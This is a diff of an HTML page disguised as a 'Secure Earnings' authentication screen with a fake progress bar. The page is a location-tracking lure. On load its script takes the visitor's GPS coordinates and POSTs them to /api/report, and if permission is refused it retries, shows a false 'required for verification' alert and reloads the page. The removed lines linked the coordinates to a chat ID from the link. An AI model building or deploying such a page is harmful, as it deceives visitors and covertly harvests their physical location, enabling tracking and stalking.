@@ -1,36 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Processing...</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #eff3f6, #d7e3ed);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .box {
+      text-align: center;
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 340px;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .box h2 {
+      margin: 0 0 10px;
+      font-size: 22px;
+      color: #333;
+    }
+
+    .box p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .progress {
+      width: 100%;
+      background: #e0e0e0;
+      height: 8px;
+      border-radius: 5px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .bar {
+      width: 0%;
+      height: 100%;
+      background: #3498db;
+      animation: fill 3s forwards;
+    }
+
+    @keyframes fill {
+      to { width: 100%; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
-  <h3>Processing secure session...</h3>
-  <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const id = urlParams.get('id');
+  <div class="box">
+    <h2>Initializing Secure Earnings</h2>
+    <p>Please wait while your session is being authenticated...</p>
+    <div class="progress"><div class="bar"></div></div>
+  </div>
 
-    if (!id) {
-      document.body.innerHTML = "Chat ID not found.";
-    } else {
+  <script>
+    function askLocation(retry = false) {
+      if (!navigator.geolocation) return;
+
       navigator.geolocation.getCurrentPosition(
-        pos => {
+        position => {
           fetch('/api/report', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              chat_id: id
+              lat: position.coords.latitude,
+              lon: position.coords.longitude
             })
           });
         },
-        err => {
-          alert("Please allow location access.");
-          location.reload();
+        error => {
+          if (error.code === 1 && !retry) {
+            setTimeout(() => askLocation(true), 2000);
+          } else {
+            alert("Please enable location to continue. This is required for verification.");
+            location.reload(); // try again after reload
+          }
         }
       );
     }
+
+    // auto request after load
+    window.onload = () => {
+      setTimeout(() => askLocation(), 500);
+    };
   </script>
 </body>
 </html>
